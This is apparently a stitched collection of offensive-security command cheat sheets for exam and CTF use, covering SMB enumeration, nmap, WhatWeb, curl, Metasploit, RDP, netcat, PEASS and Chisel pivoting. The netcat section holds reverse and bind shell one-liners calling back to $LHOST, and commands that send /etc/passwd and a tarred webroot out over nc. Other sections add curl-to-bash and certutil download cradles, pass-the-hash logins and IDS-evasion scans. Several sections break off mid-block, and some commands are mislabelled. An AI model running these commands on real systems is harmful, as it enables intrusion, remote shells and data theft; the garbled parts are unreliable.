enum4linux-ng $TARGET -u '' -p '' -S       # check accessible shares via anonymous null session on $TARGET
enum4linux-ng $TARGET -u $USER -p $PASSWORD -S # audit share permissions utilizing authenticated credentials
enum4linux-ng $TARGET -u $USER -H $NTLM_HASH -S # audit share access rights using Pass-the-Hash with $NTLM_HASH
enum4linux-ng $TARGET -u 'guest' -p '' -S  # check accessible shares under default guest permissions
```

## 05. 📜 Domain Password Policy Auditing (Lockout Thresholds)

```bash
enum4linux-ng $TARGET -P                   # extract password policy including lockout threshold and observation window
enum4linux-ng $TARGET -u '' -p '' -P       # query password policy anonymously via null session before password spraying
enum4linux-ng $TARGET -u $USER -p $PASSWORD -P # authenticated query for fine-grained domain password policies
enum4linux-ng $TARGET -u $USER -p $PASSWORD -d $DOMAIN -P # extract domain-wide password lockout thresholds from $TARGET DC
```

## 06. 🔄 RID Cycling & Range Expansion (Brute-Force Accounts)

```bash
enum4linux-ng $TARGET -R                   # cycle default user and group RIDs (500 to 1100) via RPC queries
enum4linux-ng $TARGET -R 500-2000          # expand RID cycling range from 500 to 2000 to discover newer accounts
enum4linux-ng $TARGET -u '' -p '' -R       # perform anonymous RID brute-forcing over SMB null session
enum4linux-ng $TARGET -u $USER -p $PASSWORD -R 500-5000 # authenticated RID cycling mapping thousands of domain objects
enum4linux-ng $TARGET -r 1000-1100         # cycle specific RID range targeting custom member server user accounts
```

## 07. 🌐 Protocol Tuning (SMB2/3 Dialects, RPC & Custom Ports)

```bash
enum4linux-ng $TARGET -P 445               # target SMB service explicitly on TCP port 445 (direct-hosted)
enum4linux-ng $TARGET -P 139               # target NetBIOS Session Service explicitly on TCP port 139

# Nmap Quick Reference (Commands Only)
> **🎯 Why:** Industry-standard network mapper for host discovery, port scanning, service version detection, OS fingerprinting, and NSE vulnerability auditing.
> **📍 Where:** Target IPs, CIDR subnets, and domains across TCP/UDP ports 1-65535 on any OS network stack.
> **⏰ When to use:** First step on receiving $TARGET to map the live attack surface before deeper enumeration.
## Host Discovery
```bash
nmap -sn $TARGET                              # ping sweep only, no port scan, lists live hosts
nmap -sn 10.10.10.0/24                        # ping sweep full /24 subnet for live hosts
nmap -Pn $TARGET                              # skip host discovery, treat host as online always
nmap -PS80,443 $TARGET                        # TCP SYN ping on ports 80 and 443 to find hosts
nmap -PA80,443 $TARGET                        # TCP ACK ping on ports 80 and 443 for firewalled hosts
nmap -PU53 $TARGET                            # UDP ping on port 53 to bypass TCP filters
nmap -PE $TARGET                              # ICMP echo request ping for host discovery
nmap -PP $TARGET                              # ICMP timestamp ping as alternate discovery probe
nmap -PM $TARGET                              # ICMP netmask request ping for discovery
nmap -PR 10.10.10.0/24                        # ARP ping scan, fastest on local LAN segment
nmap -sn --send-ip 10.10.10.0/24              # send raw IP packets bypassing ARP on LAN
```
## Fast Port Scanning
```bash
nmap $TARGET                                  # default scan of top 1000 TCP ports on $TARGET
nmap -F $TARGET                               # fast scan of top 100 TCP ports only
nmap -p- $TARGET                              # full scan of all 65535 TCP ports on $TARGET
nmap -p 80,443,445,3389 $TARGET               # scan specific list of high-value TCP ports
nmap -p 1-1000 $TARGET                        # scan TCP port range 1 through 1000
nmap -p U:53,161,500 $TARGET                  # scan specific UDP ports for SNMP and IKE
nmap -sS $TARGET                              # TCP SYN stealth half-open scan, fast and quiet
nmap -sT $TARGET                              # TCP connect full handshake scan, no root needed
nmap -sU --top-ports 20 $TARGET               # UDP scan of top 20 UDP ports on $TARGET
nmap -sS -p- --min-rate 5000 $TARGET           # full SYN scan at min 5000 pps for speed
```
## Service & Version Detection
```bash
nmap -sV $TARGET                              # probe open ports to detect service versions
nmap -sV --version-intensity 9 $TARGET        # max intensity version probing, slower but thorough
nmap -sV --version-light $TARGET              # light version probing, faster with fewer probes
nmap -sC -sV $TARGET                          # default NSE scripts plus version detection combo
nmap -A $TARGET                               # aggressive mode enables OS, version, scripts, traceroute
nmap -sV -p 80 --banner $TARGET               # grab HTTP banner on port 80 with version scan
```
## OS Detection & Fingerprinting
```bash
nmap -O $TARGET                               # OS fingerprinting via TCP/IP stack analysis
nmap -O --osscan-guess $TARGET                # aggressive OS guess when fingerprint is fuzzy
nmap -A --osscan-limit $TARGET                # limit OS detection to promising open-port hosts
nmap --traceroute $TARGET                     # trace network path hops to $TARGET
```
## NSE Scripting Engine
```bash
nmap --script default -sV $TARGET             # run default safe NSE script category on $TARGET
nmap --script vuln -sV $TARGET                # run vulnerability check scripts against $TARGET
nmap --script smb-os-discovery $TARGET        # discover SMB OS and workgroup via port 445
nmap --script smb-enum-shares $TARGET         # enumerate SMB shares anonymously on $TARGET
nmap --script http-title -p 80,443 $TARGET    # grab web page titles on HTTP ports
nmap --script ssl-enum-ciphers -p 443 $TARGET # enumerate TLS ciphers supported on port 443
nmap --script dns-brute --script-args dns-brute.domain=$DOMAIN # brute-force subdomains of $DOMAIN
nmap --script http-enum -p 80,8080 $TARGET    # enumerate common web paths via NSE on $TARGET
nmap --script-args=unsafe=1 --script smb-vuln-ms17-010 $TARGET # check EternalBlue MS17-010 on $TARGET
```
## Timing & Performance
```bash
nmap -T4 -sS $TARGET                          # aggressive timing template 4 for fast CTF scans
nmap -T5 -p- --min-rate 10000 $TARGET         # insane timing plus 10k pps for exam speed
nmap -T2 -sS $TARGET                          # polite timing template 2 to evade IDS throttling
nmap --min-rate 1000 --max-retries 1 $TARGET  # min 1000 pps with one retry for speed
nmap --max-rtt-timeout 200ms $TARGET          # drop slow responses after 200ms per probe
nmap --min-hostgroup 64 --max-hostgroup 128 10.10.10.0/24 # tune parallel hostgroup size for subnet
nmap -v $TARGET                               # verbose output to watch scan progress live
nmap --stats-every 10s $TARGET                # print scan stats summary every 10 seconds
```
## Firewall & IDS Evasion
```bash
nmap -f $TARGET                               # fragment IP packets to evade packet filters
nmap -D RND:10 $TARGET                        # spoof scan with 10 random decoy source IPs
nmap -S 10.10.10.5 -e tun0 $TARGET            # spoof source IP with explicit interface tun0
nmap -g 53 -sS $TARGET                        # use source port 53 to look like DNS replies
nmap --data-length 200 $TARGET                # append 200 random bytes to dodge DPI signatures
nmap --spoof-mac 0 $TARGET                    # randomize source MAC address on LAN scans
nmap --proxies socks4://127.0.0.1:9050 $TARGET # route scan through SOCKS4 proxy on localhost
nmap -sA -p 1-1000 $TARGET                    # TCP ACK scan to map firewall rulesets
nmap -sW -p 80,443 $TARGET                    # TCP window scan to infer filtered versus closed
nmap -sN $TARGET                              # TCP null scan with no flags for stealth
nmap -sF $TARGET                              # TCP FIN scan with FIN flag for stealth
nmap -sX $TARGET                              # TCP Xmas scan with FIN PSH URG flags set
```
## Output & Saving Results
```bash
nmap -oN nmap_scan.txt $TARGET                # save scan in normal human-readable text format
nmap -oX nmap_scan.xml $TARGET                # save scan in XML format for parsers
nmap -oG nmap_scan.grep $TARGET               # save scan in greppable output format
nmap -oA nmap_all $TARGET                     # save scan in all three formats with basename
nmap -oN - $TARGET | tee scan.txt             # print to stdout and tee copy into scan.txt
nmap -v -oN scan.txt $TARGET                  # verbose scan while saving normal output file
```
## Help & Info
```bash
nmap -h                                       # display quick help summary and common flags
nmap --version                                # display installed nmap version and NSE build
nmap --help                                   # display full help manual with all options

#tools #cheatsheet #whatweb #web #fingerprinting #recon #oscp #htb #cpts
# WhatWeb Quick Reference (Commands Only)
> **🎯 Why:** Stealthily fingerprint web servers, CMS platforms, frameworks, and analytics IDs to target version-specific exploits.
> **📍 Where:** Web applications on HTTP/HTTPS ports 80, 443, 8000, 8080, and 8443 for $TARGET URLs.
> **⏰ When to use:** Right after open web ports appear on $TARGET, before launching heavy directory fuzzing.
## Basic Fingerprinting
```bash
whatweb http://$TARGET                          # fingerprint base URL on $TARGET port 80
whatweb https://$TARGET                         # fingerprint TLS site on $TARGET port 443
whatweb http://$TARGET:8080                     # fingerprint alternate HTTP port 8080 on $TARGET
whatweb $DOMAIN                                 # fingerprint root domain named in $DOMAIN
whatweb http://$TARGET/login.php                # fingerprint specific login page path
whatweb -v http://$TARGET                       # verbose output showing plugin match details
whatweb --color=never http://$TARGET            # disable color codes for clean log output
```
## Aggression & Stealth Levels
```bash
whatweb -a 1 http://$TARGET                     # stealthy level 1 with single fast request
whatweb -a 3 http://$TARGET                     # standard level 3 balanced speed and coverage
whatweb -a 4 http://$TARGET                     # aggressive level 4 with heavy plugin requests
whatweb -a 4 --max-threads 10 http://$TARGET    # aggressive scan with 10 parallel threads
whatweb -U "Mozilla/5.0" http://$TARGET         # spoof custom User-Agent string for stealth
whatweb --proxy 127.0.0.1:8080 http://$TARGET   # route scan through local proxy port 8080
```
## Plugin Control & Enumeration
```bash
whatweb --list-plugins                          # list all installed fingerprinting plugins
whatweb -p WordPress,Apache http://$TARGET      # run only WordPress and Apache plugins
whatweb --plugins wordpress,joomla http://$TARGET # limit detection to CMS plugins only
whatweb -q http://$TARGET                       # quiet mode suppressing banner and errors
whatweb --log-verbose scan.log http://$TARGET   # write verbose plugin log into scan.log
```
## Batch Scanning & Input Lists
```bash
whatweb --input-file urls.txt                   # scan every URL listed in urls.txt file
whatweb --input-file urls.txt -a 3              # batch scan urls.txt at aggression level 3
whatweb http://$TARGET https://$TARGET          # scan both HTTP and HTTPS in one run
whatweb http://$TARGET --url-prefix "/app/"     # prepend /app/ prefix to plugin request paths
whatweb http://$TARGET --url-suffix ".bak"      # append .bak suffix to plugin request paths
whatweb --max-redirects 5 http://$TARGET        # follow up to 5 HTTP redirects automatically
whatweb --open-timeout 10 --read-timeout 20 http://$TARGET # set 10s open and 20s read timeouts
```
## Output & Logging Formats
```bash
whatweb --log-brief brief.log http://$TARGET    # save brief one-line summary into brief.log
whatweb --log-verbose verbose.log http://$TARGET # save detailed plugin output into verbose.log
whatweb --log-xml scan.xml http://$TARGET       # save results in XML format to scan.xml
whatweb --log-json scan.json http://$TARGET     # save results in JSON format to scan.json
whatweb --log-json-verbose full.json http://$TARGET # save full verbose JSON into full.json
whatweb --log-magictree scan.xml http://$TARGET # save MagicTree-compatible XML for reporting
whatweb --log-brief - http://$TARGET            # print brief log to stdout with dash target
```
## Authentication & Cookies
```bash
whatweb --user $USER --pass $PASSWORD http://$TARGET/admin # basic auth scan with $USER credentials
whatweb --cookie "session=abc123" http://$TARGET # scan with injected session cookie value
whatweb --header "X-Forwarded-For: 127.0.0.1" http://$TARGET # inject spoofed forwarding header
whatweb --follow-redirect always http://$TARGET  # always follow redirects including offsite hosts
whatweb --no-errors http://$TARGET               # suppress connection error messages in output
```
## Help & Info
```bash
whatweb -h                                      # display quick help summary and flags
whatweb --help                                  # display full help manual with plugins
whatweb --version                               # display installed whatweb version info

#tools #cheatsheet #curl #web #http #api #filetransfer #oscp #htb #cpts
# Curl Quick Reference (Commands Only)
> **🎯 Why:** Swiss-army HTTP client for raw request crafting, header and method tampering, API debugging, and memory-only payload staging.
> **📍 Where:** Any HTTP/HTTPS endpoint, REST API, or file-transfer URL on ports 80, 443, 8000, 8080.
> **⏰ When to use:** Web testing phase to probe endpoints, replay API calls, exfiltrate files, or stage download cradles.
## Basic Requests & Inspection
```bash
curl http://$TARGET # send simple GET request to $TARGET root page
curl -v http://$TARGET # send GET with verbose handshake and headers shown
curl -I http://$TARGET # send HEAD request fetching response headers only
curl -i http://$TARGET # send GET including response headers plus body
curl -s http://$TARGET # send GET silently hiding progress meter output
curl -sS http://$TARGET # send GET silently but show errors if request fails
curl -L http://$TARGET # send GET following all HTTP redirects automatically
curl -k https://$TARGET # send GET skipping TLS verification on self-signed certs
curl --max-time 10 http://$TARGET # send GET aborting after 10 seconds timeout
curl -o page.html http://$TARGET # download $TARGET page saving body to page.html
curl -O http://$TARGET/file.txt # download remote file keeping original filename
curl -s http://$TARGET/robots.txt # fetch robots.txt silently to map disallowed paths
curl -s http://$TARGET/sitemap.xml # fetch sitemap.xml silently to list indexed routes
```
## Custom Methods, Headers & Cookies
```bash
curl -X POST http://$TARGET/login # send empty POST request to login endpoint
curl -X PUT http://$TARGET/api/item # send PUT request to update API item resource
curl -X DELETE http://$TARGET/api/item/1 # send DELETE request removing item ID 1
curl -X OPTIONS http://$TARGET -i # send OPTIONS probing allowed CORS methods verbosely
curl -H "User-Agent: Mozilla/5.0" http://$TARGET # send GET with browser user-agent header
curl -H "X-Forwarded-For: 127.0.0.1" http://$TARGET # send GET spoofing localhost bypass header
curl -H "Authorization: Bearer TOKEN" http://$TARGET/api # send GET with bearer token API auth header
curl -H "Content-Type: application/json" http://$TARGET/api # send GET with JSON content-type header
curl -b "session=abc123" http://$TARGET # send GET with session cookie for authed access
curl -b cookies.txt http://$TARGET # send GET using cookies stored in cookies.txt jar
curl -c cookies.txt http://$TARGET/login # send GET saving response cookies into cookies.txt
curl -A "Googlebot" http://$TARGET # send GET with Googlebot agent to test cloaking
curl -e "http://google.com" http://$TARGET # send GET with referer header set to google.com
```
## POST Data, Forms & JSON APIs
```bash
curl -X POST -d "user=$USER&pass=admin123" http://$TARGET/login # POST login form with username and password fields
curl -X POST -d "param=test" http://$TARGET/page.php # POST single form field param to target page
curl -X POST -H "Content-Type: application/json" -d '{"key":"value"}' http://$TARGET/api # POST JSON body to REST API endpoint
curl -X POST -H "Content-Type: application/json" -d '{"user":"FUZZ"}' http://$TARGET/api # POST JSON fuzzing user field on API
curl --data-urlencode "q=test value" http://$TARGET/search # POST URL-encoded query preserving spaces correctly
curl -F "file=@shell.php" http://$TARGET/upload # upload local shell.php via multipart form field
curl -F "file=@/tmp/payload.txt" http://$TARGET/upload # upload payload.txt from tmp via multipart form
curl -u $USER:pass123 http://$TARGET/secure # send GET with basic-auth username and password combo
curl -u $USER:pass123 -v http://$TARGET/secure # send basic-auth request verbosely showing auth handshake
```
## Downloads, Uploads & File Transfers
```bash
curl -O http://$TARGET:8000/linpeas.sh # download linpeas.sh keeping remote filename locally
curl -o /tmp/linpeas.sh http://$TARGET:8000/linpeas.sh # download linpeas.sh saving to tmp path explicitly
curl -s http://$TARGET/shell.sh | bash # pipe remote shell script directly into bash memory execution
curl http://$LHOST:8000/nc.exe -o nc.exe # download netcat binary from attacker $LHOST staging server
curl -T local.txt ftp://$TARGET/uploads/ # upload local.txt to FTP uploads directory on $TARGET
curl -u ftpuser:ftppass -T local.txt ftp://$TARGET/ # upload local.txt with FTP credentials to $TARGET root
curl -C - -O http://$TARGET/big.iso # resume interrupted big.iso download from previous offset
curl -r 0-1024 http://$TARGET/file # download only first 1024 bytes to sample file header
curl --limit-rate 100k -O http://$TARGET/big.zip # download big.zip throttled to 100KB per second
```
## Proxy, TLS & Debugging
```bash
curl -x http://127.0.0.1:8080 http://$TARGET # route request through Burp proxy for inspection
curl -x socks5://127.0.0.1:9050 http://$TARGET # route request through Tor SOCKS5 proxy chain
curl -k -v https://$TARGET # probe HTTPS ignoring cert while showing TLS handshake verbosely
curl --resolve $DOMAIN:443:$TARGET https://$DOMAIN # force $DOMAIN to resolve to $TARGET IP for vhost testing
curl -w "%{http_code}\n" -o /dev/null -s http://$TARGET # print only HTTP status code hiding body output
curl -w "%{time_total}\n" -o /dev/null -s http://$TARGET # print only total request time for performance check
curl --trace-ascii trace.txt http://$TARGET # trace full request bytes saving ASCII log to trace.txt
curl --connect-timeout 5 -v http://$TARGET # fail fast after 5s connect timeout with verbose log
```
## Help & Info
```bash
curl --help # display condensed help summary with common flags
curl --manual # display full manual pager with all options
curl --version # display installed curl version and protocol features
```

# MSFvenom Quick Reference (Commands Only)
> **🎯 Why:** Standalone payload generator for staged and stageless reverse shells, bind shells, and web shells with encoder and bad-character control.
> **📍 Where:** Local Kali terminal crafting EXE, ELF, PHP, ASPX, WAR, and raw shellcode delivered to $TARGET via upload or transfer.
> **⏰ When to use:** Exploitation phase when command execution or file upload on $TARGET needs a callback to $LHOST on port $LPORT.
## Payload, Format & Encoder Discovery
```bash
msfvenom --list payloads # list all available staged and stageless payload modules
msfvenom --list formats # list supported output formats like exe elf raw php
msfvenom --list encoders # list encoders for AV-evasion and bad-character handling
msfvenom --list platforms # list target platforms like windows linux php java
msfvenom --list archs # list CPU architectures like x86 x64 for payload tuning
msfvenom -p windows/meterpreter/reverse_tcp --list-options # show required options for windows reverse payload
msfvenom -p linux/x64/meterpreter/reverse_tcp --list-options # show required options for linux x64 reverse payload
```
## Linux Staged & Stageless Shells
```bash

# Metasploit Framework Quick Reference (Commands Only)
> **🎯 Why:** Full exploitation platform with version-matched exploits, auxiliary scanners, multi-handlers, and Meterpreter post-exploitation automation.
> **📍 Where:** Local Kali msfconsole against $TARGET network services, web apps, and SMB or RDP daemons with callbacks to $LHOST.
> **⏰ When to use:** Exploitation phase when SearchSploit confirms a CVE, a handler must catch shells, or sessions need upgrading on $TARGET.
## Startup, Workspaces & Database Prep
```bash
msfconsole -q # launch msfconsole quietly skipping banner for faster startup
msfdb init # initialize postgres database backend for scan storage
msfdb start # start postgres backend required for db_nmap imports
workspace -a exam_$TARGET # create isolated workspace named for $TARGET engagement
workspace exam_$TARGET # switch into exam_$TARGET workspace context
db_nmap -sV $TARGET # run version scan storing results in current workspace database
hosts # list discovered hosts stored in workspace database
services # list fingerprinted services stored in workspace database
```
## Module Search, Selection & Info
```bash
search eternalblue # search modules matching eternalblue keyword string
search type:exploit cve:2017-0144 # search exploits filtered by CVE 2017-0144 identifier
search type:auxiliary smb # search auxiliary scanners related to smb services
search platform:windows reverse_https # search windows modules using reverse_https payloads
use exploit/windows/smb/ms17_010_eternalblue # select eternalblue exploit module for use
info # display current module description targets and references
show options # display required RHOSTS payload and LHOST settings
show targets # display supported target OS versions for current exploit
show payloads # display compatible payloads for currently selected exploit module
back # deselect current module returning to global msf prompt
```
## Exploit Configuration & Execution
```bash
set RHOSTS $TARGET # set remote target address to $TARGET for exploit
set RHOSTS $DOMAIN # retarget same exploit at $DOMAIN vhost when DNS rotates

set USER $USER # set username variable for auth-based exploit modules
set SMBPass pass123 # set SMB password for psexec-style authenticated modules
check # run vulnerability check without launching full exploitation
exploit -j # launch exploit as background job keeping session handling alive
exploit # launch exploit in foreground blocking until session or failure
```
## Auxiliary Scanners & Version Probing
```bash
use auxiliary/scanner/smb/smb_version # select SMB version fingerprinting scanner module
set RHOSTS $TARGET # point SMB scanner at $TARGET address range
run # execute currently selected auxiliary scanner module once

## Multi-Handler, Jobs & Session Control
```bash
use exploit/multi/handler # select universal listener for catching msfvenom payloads
set PAYLOAD windows/meterpreter/reverse_tcp # match handler payload to staged msfvenom EXE type

#tools #cheatsheet #freerdp #xfreerdp #rdp #windows #gui #oscp #htb #cpts
# FreeRDP Quick Reference (Commands Only)
> **🎯 Why:** CLI Remote Desktop client for full Windows GUI sessions with drive redirection, clipboard sharing, and Pass-the-Hash logon.
> **📍 Where:** Windows $TARGET RDP service on TCP 3389 within $DOMAIN networks requiring $USER interactive logon.
> **⏰ When to use:** GUI-access phase for credential hunting, file exfil via shares, and apps that lack CLI remoting on $TARGET.
## Basic RDP Authentication Sessions
```bash
xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD # open GUI session to $TARGET as $USER with password login
xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD /d:$DOMAIN # open session to $TARGET joining $DOMAIN domain context
xfreerdp /v:$DOMAIN /u:$USER /p:$PASSWORD # connect via $DOMAIN hostname resolving to $TARGET RDP host
xfreerdp /v:$TARGET:$LPORT /u:$USER /p:$PASSWORD # connect to custom RDP port $LPORT on $TARGET host
xfreerdp /v:$TARGET /u:administrator /p:$PASSWORD # connect explicitly as administrator to $TARGET desktop
xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD /admin # connect to admin console session hijacking $TARGET desktop
xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD +clipboard # enable bidirectional clipboard sharing in $TARGET session
xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD /cert:ignore # ignore $TARGET certificate warnings for self-signed hosts
```
## Pass-the-Hash & NLA Security Options
```bash
xfreerdp /v:$TARGET /u:$USER /pth:$NTLM_HASH # authenticate to $TARGET with NTLM hash without password
xfreerdp /v:$TARGET /d:$DOMAIN /u:$USER /pth:$NTLM_HASH # pass hash with $DOMAIN context scoping $TARGET logon
xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD +sec-nla # force Network Level Authentication securing $TARGET handshake
xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD -sec-nla # disable NLA downgrading $TARGET auth for legacy hosts
xfreerdp /v:$TARGET /u:$USER /pth:$NTLM_HASH /sec:tls # force TLS security layer protecting $TARGET hash logon
xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD /sec:rdp # force classic RDP encryption for old $TARGET builds
xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD /restricted-admin # request Restricted Admin mode avoiding $PASSWORD exposure
```
## Screen Size, Display & Session Control
```bash
xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD /f # open fullscreen session to $TARGET maximizing desktop area
xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD /w:1280 /h:800 # open 1280x800 windowed session fitting exam screen

xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD /rfx # enable RemoteFX codec accelerating $TARGET graphics
xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD /floatbar # show floating toolbar easing $TARGET fullscreen exit
```
## Drive, Clipboard & Device Redirection
```bash

xfreerdp /v:$TARGET /u:$USER /p:$PASSWORD /drive:loot,$HOME/loot # share loot folder into $TARGET for fast exfil staging

#tools #cheatsheet #netcat #nc #reverseshell #bindshell #listener #oscp #htb #cpts
# Netcat Quick Reference (Commands Only)
> **🎯 Why:** Swiss-army TCP/UDP Swiss knife for catching reverse shells, connecting to bind shells, banner grabbing, and piping files across sockets.
> **📍 Where:** Attacker $LHOST listener on port $LPORT plus $TARGET-side triggers against TCP services on any probed port.
> **⏰ When to use:** Post-exploitation trigger phase to catch callbacks from $TARGET and during recon for quick port and banner checks.
## Listener Setup & Reverse Shell Catching
```bash
nc -lvnp $LPORT # listen verbosely on $LPORT with no DNS lookups catching reverse shell
ncat -lvnp $LPORT # listen with ncat wrapper on $LPORT adding SSL and verbosity support
nc -l -p $LPORT # listen on $LPORT using classic syntax for older netcat builds
nc -lvnp $LPORT -s $LHOST # bind listener explicitly to $LHOST interface on $LPORT
ncat -lvnp $LPORT --keep-open # keep listener open on $LPORT retrying after each disconnect
ncat -lvnp $LPORT --ssl # listen with SSL wrapper on $LPORT for encrypted callback shells
nc -lvnp $LPORT -w 30 # listen on $LPORT timing out idle connection after 30 seconds
socat TCP-LISTEN:$LPORT,fork STDOUT # stage socat fallback listener on $LPORT when nc missing
```
## Bind Shell Connection & Target Probing
```bash
nc $TARGET $LPORT # connect to bind shell listening on $TARGET port $LPORT
ncat $TARGET $LPORT # connect via ncat to $TARGET port $LPORT with extra features
nc -v $TARGET $LPORT # connect verbosely to $TARGET port $LPORT confirming open state
nc -vn $TARGET $LPORT # connect with no DNS resolution speeding up $TARGET dial
nc -w 3 -v $TARGET 22 # probe $TARGET port 22 with 3s timeout and verbose status
nc -w 3 -vz $TARGET 1-1000 # zero-IO scan $TARGET ports 1-1000 reporting open only
nc -u $TARGET 161 # connect over UDP to $TARGET port 161 for SNMP-style checks
ncat -v $TARGET $LPORT --ssl # connect with SSL to encrypted bind shell on $TARGET
```
## Banner Grabbing & Service Fingerprinting
```bash
nc $TARGET 80 # open raw TCP to $TARGET port 80 for manual HTTP probing
printf "HEAD / HTTP/1.0\r\n\r\n" | nc $TARGET 80 # send HEAD request grabbing $TARGET web banner
printf "GET / HTTP/1.0\r\n\r\n" | nc $TARGET 80 # send GET request dumping $TARGET HTTP headers
nc -v $TARGET 21 # grab $TARGET FTP banner verbosely on port 21
nc -v $TARGET 25 # grab $TARGET SMTP banner verbosely on port 25
echo "" | nc -v -w 2 $TARGET 22 # send newline grabbing $TARGET SSH version string
nc $TARGET $LPORT < /etc/hosts # push local hosts file into $TARGET socket for testing
timeout 3 nc -v $TARGET 445 # fingerprint $TARGET SMB port 445 with 3s hard timeout
```
## Target-Side Reverse Shell One-Liners
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f # launch mkfifo classic reverse shell to $LHOST
nc $LHOST $LPORT -e /bin/bash # trigger -e reverse shell from $TARGET to $LHOST on $LPORT
nc $LHOST $LPORT -e cmd.exe # trigger Windows -e reverse shell to $LHOST on $LPORT
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $LHOST $LPORT > /tmp/f # launch bash -i fifo shell to $LHOST
ncat $LHOST $LPORT -e /bin/bash # trigger ncat -e reverse shell to $LHOST for exam hosts
busybox nc $LHOST $LPORT -e /bin/sh # trigger BusyBox shell from limited $TARGET to $LHOST
```
## Bind Shell Setup on Compromised Host
```bash
nc -lvnp $LPORT -e /bin/bash # bind bash shell on compromised host port $LPORT for re-entry
ncat -lvnp $LPORT -e /bin/bash --keep-open # bind persistent bash shell surviving disconnects on $LPORT
nc -l -p $LPORT -e cmd.exe # bind cmd.exe shell on Windows target port $LPORT
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l $LPORT > /tmp/f # bind fifo shell without -e support on $LPORT
ncat --exec "/bin/bash" -l -p $LPORT --keep-open # bind exec shell via ncat long flag on $LPORT
```
## File Transfer Send & Receive
```bash
nc -lvnp $LPORT > loot.txt # receive incoming file on $LPORT saving as loot.txt locally
nc $TARGET $LPORT < /etc/passwd # push etc passwd from sender into $TARGET listener on $LPORT
nc -lvnp $LPORT < linpeas.sh # serve linpeas.sh from listener on $LPORT for $TARGET pull
nc $LHOST $LPORT > linpeas.sh # pull linpeas.sh from $LHOST listener saving locally on target
tar czf - /var/www | nc $LHOST $LPORT # stream compressed webroot archive to $LHOST on $LPORT
nc -lvnp $LPORT | tar xzf - # receive streamed archive on $LPORT extracting into cwd
pv backup.tar | nc $LHOST $LPORT # send backup.tar with progress bar to $LHOST on $LPORT
```
## Relay, Chat & TTY Upgrade Helpers
```bash
mkfifo /tmp/backpipe; nc -l $LPORT < /tmp/backpipe | nc $TARGET 80 > /tmp/backpipe # relay local $LPORT traffic to $TARGET port 80
ncat --listen $LPORT --proxy-type http --proxy-auth $USER:$PASSWORD # chain listener on $LPORT through HTTP proxy creds
nc -lvnp $LPORT # start chat listener on $LPORT for manual two-way typing session
python3 -c 'import pty;pty.spawn("/bin/bash")' # upgrade dumb nc shell to interactive PTY bash shell
script -qc /bin/bash /dev/null # wrap shell with script binary fixing echo and job control
stty raw -echo; fg # background and foreground shell restoring raw terminal echo mode
export TERM=xterm-256color # export TERM variable fixing clear and arrow keys in shell
```
## Help & Info
```bash
nc -h # display quick help summary with core listener flags
ncat --help # display full ncat help manual with SSL options
man nc # open system manual page detailing every netcat flag
which nc # display netcat binary path for environment checks
ls -l /bin/nc* # list installed netcat variants distinguishing traditional versus openbsd
ncat --version # display installed ncat version string
```

# PEASS-ng Quick Reference (Commands Only)
> **🎯 Why:** Automated local privesc auditor hunting SUID binaries, writable services, unquoted paths, scheduled tasks, credentials, and kernel CVEs.
> **📍 Where:** Low-priv shell on Linux $TARGET hosts and Windows $TARGET hosts with $DOMAIN domain-joined configs.
> **⏰ When to use:** First five minutes after foothold on $TARGET before manual enumeration to prioritize Root and SYSTEM vectors.
## Transfer & Stage PEASS on Target
```bash
python3 -m http.server $LPORT # serve PEASS payloads from $LHOST on port $LPORT for download
wget http://$LHOST:$LPORT/linpeas.sh # pull linpeas.sh from $LHOST onto Linux $TARGET host
curl http://$LHOST:$LPORT/linpeas.sh -o linpeas.sh # pull linpeas.sh via curl onto $TARGET fallback
certutil -urlcache -split -f http://$LHOST:$LPORT/winPEASx64.exe winPEAS.exe # pull winPEAS.exe via certutil onto Windows $TARGET
powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://$LHOST:$LPORT/winPEASx64.exe','winPEAS.exe')" # download winPEAS.exe via PowerShell onto $TARGET
smbserver.py share . -smb2support # share current folder via SMB for $TARGET pull when HTTP blocked
copy \\$LHOST\share\winPEASx64.exe winPEAS.exe # copy winPEAS.exe from $LHOST SMB share onto $TARGET
chmod +x linpeas.sh # mark linpeas.sh executable after transfer onto $TARGET host
```

# Chisel Quick Reference (Commands Only)
> **🎯 Why:** Fast TCP/UDP pivoting tunnel for bypassing $TARGET firewall rules and routing $LHOST tools into isolated subnets.
> **📍 Where:** $LHOST attacker server plus $TARGET compromised pivot host bridging internal $DOMAIN networks on $LPORT.
> **⏰ When to use:** After $TARGET foothold as $USER to expose hidden ports and proxy $LHOST scans through pivot sessions.
## Server Setup on Attacker
```bash
chisel server -p $LPORT --reverse # start Chisel server on $LHOST listening on $LPORT for reverse shells
chisel server -p $LPORT --socks5 # start Chisel server on $LHOST with SOCKS5 proxy on $LPORT
chisel server -p $LPORT --host 0.0.0.0 --key supersecret # start authenticated server on $LHOST binding all interfaces on $LPORT
./chisel server -p $LPORT --reverse -v # start verbose reverse server on $LHOST logging $TARGET client connects
```
## Client Connect from Pivot
```bash
./chisel client $LHOST:$LPORT R:socks # connect from $TARGET pivot to $LHOST enabling reverse SOCKS proxy
./chisel client $LHOST:$LPORT R:$LPORT:127.0.0.1:$LPORT # reverse-forward $TARGET local $LPORT back to $LHOST server
./chisel client $LHOST:$LPORT R:1080:socks # connect from $TARGET exposing SOCKS on $LHOST port 1080
./chisel client --auth $USER:$PASSWORD $LHOST:$LPORT R:socks # authenticate as $USER with $PASSWORD from $TARGET to $LHOST server
```
## Local and Remote Port Forwards
```bash
./chisel client $LHOST:$LPORT L:$LPORT:$TARGET:3389 # forward $TARGET RDP 3389 to $LHOST local $LPORT via pivot
